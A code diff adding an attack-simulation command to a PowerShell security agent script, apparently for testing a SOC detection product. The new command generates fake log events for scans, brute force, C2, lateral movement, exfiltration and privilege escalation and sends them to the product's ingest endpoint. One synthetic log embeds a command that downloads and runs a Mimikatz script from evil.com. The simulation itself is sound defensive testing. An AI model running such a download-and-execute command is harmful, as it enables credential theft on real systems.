@@ -719,17 +719,223 @@ function Show-Status {
     Write-Host ""
 }
 
+# ========== Attack Simulation ==========
+function Invoke-AttackSimulation {
+    param([string]$Scenario = "all")
+    $cfg = Read-Config
+    if (-not $cfg -or -not $cfg["api_key"] -or -not $cfg["api_endpoint"]) {
+        Write-Host "[FATAL] Not configured. Run './socmind-agent-windows.ps1 configure' first." -ForegroundColor Red; return
+    }
+    $apiKey = $cfg["api_key"]; $apiEndpoint = $cfg["api_endpoint"]
+    $attackerIP = "10.0.0.$(Get-Random -Minimum 50 -Maximum 254)"
+    $targetIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
+    if (-not $targetIP) { $targetIP = "192.168.1.$(Get-Random -Minimum 2 -Maximum 254)" }
+
+    Write-Host ""
+    Write-Host "============================================" -ForegroundColor Red
+    Write-Host "  SOCMind ATTACK SIMULATOR" -ForegroundColor Red
+    Write-Host "  Attacker IP: $attackerIP" -ForegroundColor Yellow
+    Write-Host "  Target IP:   $targetIP" -ForegroundColor Yellow
+    Write-Host "  Scenario:    $Scenario" -ForegroundColor Yellow
+    Write-Host "============================================" -ForegroundColor Red
+    Write-Host ""
+
+    $allLogs = @()
+
+    # === SCENARIO 1: Nmap Port Scan ===
+    if ($Scenario -in @("all", "nmap", "portscan")) {
+        Write-Host "[SIM] Generating Nmap Port Scan logs..." -ForegroundColor Magenta
+        $ports = @(22, 80, 443, 445, 3389, 8080, 8443, 3306, 5432, 1433, 6379, 27017, 9200, 5900, 21)
+        foreach ($port in $ports) {
+            $allLogs += @{
+                log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
+                timestamp = (Get-Date).AddSeconds(-$(Get-Random -Minimum 1 -Maximum 30)).ToUniversalTime().ToString("o")
+                message = "TCP SYN scan detected: $attackerIP -> ${targetIP}:$port (SYN-ACK response)"
+                severity = 4; event_type = "port_scan"
+                event_id = "5156"; mitre_tactic = "Discovery"; mitre_technique = "T1046"
+                raw_log = @{ src_ip = $attackerIP; dst_ip = $targetIP; dst_port = $port; protocol = "TCP"; flags = "SYN"; scanner = "nmap" }
+            }
+        }
+        # OS detection attempt
+        $allLogs += @{
+            log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
+            timestamp = (Get-Date).AddSeconds(-1).ToUniversalTime().ToString("o")
+            message = "OS fingerprinting attempt detected from $attackerIP - multiple probe packets with unusual TTL/window combinations"
+            severity = 4; event_type = "reconnaissance"
+            event_id = "5156"; mitre_tactic = "Discovery"; mitre_technique = "T1046"
+            raw_log = @{ src_ip = $attackerIP; technique = "OS_fingerprint"; probes = 15 }
+        }
+        Write-Host "  [+] $($ports.Count + 1) port scan events generated" -ForegroundColor Yellow
+    }
+
+    # === SCENARIO 2: SSH/RDP Brute Force ===
+    if ($Scenario -in @("all", "bruteforce", "brute")) {
+        Write-Host "[SIM] Generating Brute Force Attack logs..." -ForegroundColor Magenta
+        $users = @("administrator", "admin", "root", "user", "test", "guest", "backup", "service", "sa", "postgres")
+        foreach ($user in $users) {
+            for ($i = 0; $i -lt 5; $i++) {
+                $allLogs += @{
+                    log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
+                    timestamp = (Get-Date).AddSeconds(-$(Get-Random -Minimum 1 -Maximum 120)).ToUniversalTime().ToString("o")
+                    message = "Logon failure: Account '$user' from $attackerIP - Invalid credentials (attempt $($i+1))"
+                    severity = 4; event_type = "brute_force"
+                    event_id = "4625"; mitre_tactic = "Credential Access"; mitre_technique = "T1110"
+                    raw_log = @{ src_ip = $attackerIP; username = $user; logon_type = 10; failure_reason = "Bad password"; attempt = $i+1 }
+                }
+            }
+        }
+        # Successful login after brute force
+        $allLogs += @{
+            log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
+            timestamp = (Get-Date).ToUniversalTime().ToString("o")
+            message = "SUCCESSFUL LOGON after multiple failures: Account 'administrator' from $attackerIP via RDP"
+            severity = 5; event_type = "suspicious_login"
+            event_id = "4624"; mitre_tactic = "Initial Access"; mitre_technique = "T1078"
+            raw_log = @{ src_ip = $attackerIP; username = "administrator"; logon_type = 10; after_failures = 50 }
+        }
+        Write-Host "  [+] $($users.Count * 5 + 1) brute force events generated" -ForegroundColor Yellow
+    }
+
+    # === SCENARIO 3: C2 Beaconing ===
+    if ($Scenario -in @("all", "c2", "beacon")) {
+        Write-Host "[SIM] Generating C2 Beaconing logs..." -ForegroundColor Magenta
+        $c2Server = "185.$(Get-Random -Min 100 -Max 255).$(Get-Random -Min 1 -Max 255).$(Get-Random -Min 1 -Max 255)"
+        $c2Domain = "update-service-$(Get-Random -Min 1000 -Max 9999).xyz"
+        for ($i = 0; $i -lt 20; $i++) {
+            $allLogs += @{
+                log_type = "security"; source_ip = $targetIP; dst_ip = $c2Server
+                timestamp = (Get-Date).AddSeconds(-($i * 30)).ToUniversalTime().ToString("o")
+                message = "Periodic outbound connection: ${targetIP} -> ${c2Server}:443 every ~30s (beacon pattern detected) - Domain: $c2Domain"
+                severity = 5; event_type = "c2_communication"
+                event_id = "5156"; mitre_tactic = "Command and Control"; mitre_technique = "T1071"
+                raw_log = @{ src_ip = $targetIP; dst_ip = $c2Server; dst_port = 443; interval_seconds = 30; domain = $c2Domain; bytes_out = Get-Random -Min 64 -Max 512; bytes_in = Get-Random -Min 128 -Max 4096 }
+            }
+        }
+        # DNS tunnel attempt
+        $allLogs += @{
+            log_type = "security"; source_ip = $targetIP; dst_ip = "8.8.8.8"
+            timestamp = (Get-Date).ToUniversalTime().ToString("o")
+            message = "Suspicious DNS query: Long subdomain encoding detected - $(Get-Random -Min 100000 -Max 999999).data.$c2Domain (possible DNS tunneling)"
+            severity = 5; event_type = "dns_tunneling"
+            event_id = "5156"; mitre_tactic = "Command and Control"; mitre_technique = "T1071.004"
+            raw_log = @{ query = "$(Get-Random).data.$c2Domain"; query_length = 85; type = "TXT" }
+        }
+        Write-Host "  [+] 21 C2/beacon events generated" -ForegroundColor Yellow
+    }
+
+    # === SCENARIO 4: Lateral Movement ===
+    if ($Scenario -in @("all", "lateral")) {
+        Write-Host "[SIM] Generating Lateral Movement logs..." -ForegroundColor Magenta
+        $internalTargets = @("192.168.1.10", "192.168.1.20", "192.168.1.30", "192.168.1.50", "192.168.1.100")
+        foreach ($t in $internalTargets) {
+            $allLogs += @{
+                log_type = "security"; source_ip = $attackerIP; dst_ip = $t
+                timestamp = (Get-Date).AddSeconds(-$(Get-Random -Min 1 -Max 60)).ToUniversalTime().ToString("o")
+                message = "SMB/ADMIN$ access from compromised host $attackerIP to $t - PsExec-style lateral movement"
+                severity = 5; event_type = "lateral_movement"
+                event_id = "5140"; mitre_tactic = "Lateral Movement"; mitre_technique = "T1021.002"
+                raw_log = @{ src_ip = $attackerIP; dst_ip = $t; share = "ADMIN$"; tool = "PsExec" }
+            }
+        }
+        Write-Host "  [+] $($internalTargets.Count) lateral movement events generated" -ForegroundColor Yellow
+    }
+
+    # === SCENARIO 5: Data Exfiltration ===
+    if ($Scenario -in @("all", "exfil", "exfiltration")) {
+        Write-Host "[SIM] Generating Data Exfiltration logs..." -ForegroundColor Magenta
+        $exfilServer = "103.$(Get-Random -Min 1 -Max 255).$(Get-Random -Min 1 -Max 255).$(Get-Random -Min 1 -Max 255)"
+        for ($i = 0; $i -lt 5; $i++) {
+            $size = Get-Random -Min 50 -Max 500
+            $allLogs += @{
+                log_type = "security"; source_ip = $targetIP; dst_ip = $exfilServer
+                timestamp = (Get-Date).AddSeconds(-($i * 10)).ToUniversalTime().ToString("o")
+                message = "Large outbound data transfer: ${targetIP} -> ${exfilServer}:443 - ${size}MB transferred (abnormal volume)"
+                severity = 5; event_type = "data_exfiltration"
+                event_id = "5156"; mitre_tactic = "Exfiltration"; mitre_technique = "T1041"
+                raw_log = @{ src_ip = $targetIP; dst_ip = $exfilServer; bytes_out = $size * 1048576; protocol = "HTTPS" }
+            }
+        }
+        Write-Host "  [+] 5 exfiltration events generated" -ForegroundColor Yellow
+    }
+
+    # === SCENARIO 6: Privilege Escalation ===
+    if ($Scenario -in @("all", "privesc")) {
+        Write-Host "[SIM] Generating Privilege Escalation logs..." -ForegroundColor Magenta
+        $allLogs += @{
+            log_type = "security"; source_ip = $targetIP
+            timestamp = (Get-Date).AddSeconds(-5).ToUniversalTime().ToString("o")
+            message = "New service installed: 'SOCMindTest_Svc' running as SYSTEM - Suspicious binary path: C:\Temp\payload.exe"
+            severity = 5; event_type = "privilege_escalation"
+            event_id = "4697"; mitre_tactic = "Privilege Escalation"; mitre_technique = "T1543.003"
+            raw_log = @{ service_name = "SOCMindTest_Svc"; binary = "C:\Temp\payload.exe"; account = "LocalSystem" }
+        }
+        $allLogs += @{
+            log_type = "security"; source_ip = $targetIP
+            timestamp = (Get-Date).AddSeconds(-3).ToUniversalTime().ToString("o")
+            message = "User 'attacker' added to Administrators group by process running as SYSTEM"
+            severity = 5; event_type = "privilege_escalation"
+            event_id = "4732"; mitre_tactic = "Persistence"; mitre_technique = "T1098"
+            raw_log = @{ username = "attacker"; group = "Administrators"; added_by = "SYSTEM" }
+        }
+        $allLogs += @{
+            log_type = "security"; source_ip = $targetIP
+            timestamp = (Get-Date).ToUniversalTime().ToString("o")
+            message = "Suspicious PowerShell execution: Invoke-Mimikatz detected - credential dumping attempt"
+            severity = 5; event_type = "credential_dumping"
+            event_id = "4688"; mitre_tactic = "Credential Access"; mitre_technique = "T1003"
+            raw_log = @{ process = "powershell.exe"; cmdline = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mimikatz.ps1')"; parent = "cmd.exe" }
+        }
+        Write-Host "  [+] 3 privilege escalation events generated" -ForegroundColor Yellow
+    }
+
+    Write-Host ""
+    Write-Host "[TOTAL] $($allLogs.Count) attack events ready to send" -ForegroundColor Cyan
+
+    # Send in batches of 10
+    $batchSize = 10
+    $sent = 0
+    for ($i = 0; $i -lt $allLogs.Count; $i += $batchSize) {
+        $batch = $allLogs[$i..([Math]::Min($i + $batchSize - 1, $allLogs.Count - 1))]
+        $url = "$apiEndpoint/agent-gateway/ingest"
+        $body = @{ logs = $batch } | ConvertTo-Json -Depth 10 -Compress
+        try {
+            $headers = @{ "Content-Type" = "application/json"; "X-Agent-Key" = $apiKey; "User-Agent" = "SOCMind-Agent-Windows/$($script:AgentVersion)" }
+            $resp = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -TimeoutSec 60
+            $sent += $batch.Count
+            Write-Host "[SENT] Batch $([Math]::Floor($i/$batchSize)+1): $($batch.Count) logs -> $($resp.processed) processed, $($resp.incidents_created) incidents created" -ForegroundColor Green
+        } catch {
+            Write-Host "[ERR] Failed to send batch: $_" -ForegroundColor Red
+        }
+        Start-Sleep -Seconds 2
+    }
+
+    Write-Host ""
+    Write-Host "============================================" -ForegroundColor Green
+    Write-Host "  SIMULATION COMPLETE" -ForegroundColor Green
+    Write-Host "  Total sent: $sent / $($allLogs.Count)" -ForegroundColor Green
+    Write-Host "  Check the SOCMind Dashboard for incidents!" -ForegroundColor Cyan
+    Write-Host "============================================" -ForegroundColor Green
+    Write-Host ""
+}
+
 function Show-Help {
     Write-Host ""
     Write-Host "SOCMind Windows Agent v$($script:AgentVersion) - Universal Executor" -ForegroundColor Cyan
     Write-Host "=====================================================" -ForegroundColor Cyan
     Write-Host ""
     Write-Host "Commands:" -ForegroundColor White
-    Write-Host "  configure    - Set up API credentials and license" -ForegroundColor Gray
-    Write-Host "  run          - Start agent (collect logs + execute actions)" -ForegroundColor Gray
-    Write-Host "  run --dry-run - Start in simulation mode (no real actions)" -ForegroundColor Gray
-    Write-Host "  status       - Check agent status and recent actions" -ForegroundColor Gray
-    Write-Host "  help         - Show this message" -ForegroundColor Gray
+    Write-Host "  configure      - Set up API credentials and license" -ForegroundColor Gray
+    Write-Host "  run            - Start agent (collect logs + execute actions)" -ForegroundColor Gray
+    Write-Host "  run --dry-run  - Start in simulation mode (no real actions)" -ForegroundColor Gray
+    Write-Host "  simulate       - Run ALL attack scenarios (nmap + brute force + C2 + lateral + exfil + privesc)" -ForegroundColor Gray
+    Write-Host "  simulate nmap  - Simulate Nmap port scan only" -ForegroundColor Gray
+    Write-Host "  simulate brute - Simulate brute force attack only" -ForegroundColor Gray
+    Write-Host "  simulate c2    - Simulate C2 beaconing only" -ForegroundColor Gray
+    Write-Host "  simulate lateral - Simulate lateral movement only" -ForegroundColor Gray
+    Write-Host "  simulate exfil - Simulate data exfiltration only" -ForegroundColor Gray
+    Write-Host "  simulate privesc - Simulate privilege escalation only" -ForegroundColor Gray
+    Write-Host "  status         - Check agent status and recent actions" -ForegroundColor Gray
+    Write-Host "  help           - Show this message" -ForegroundColor Gray
     Write-Host ""
     Write-Host "Supported Actions:" -ForegroundColor White
     Write-Host "  block_ip, unblock_ip, kill_process, disable_user, enable_user" -ForegroundColor Gray
@@ -747,6 +953,10 @@ switch ($Command.ToLower()) {
         Invoke-Run -DryRun:$isDryRun
     }
     "start"     { Invoke-Run }
+    "simulate"  {
+        $scenario = if ($args.Count -gt 0) { $args[0] } else { "all" }
+        Invoke-AttackSimulation -Scenario $scenario
+    }
     "status"    { Show-Status }
     "help"      { Show-Help }
     default     { Show-Help }
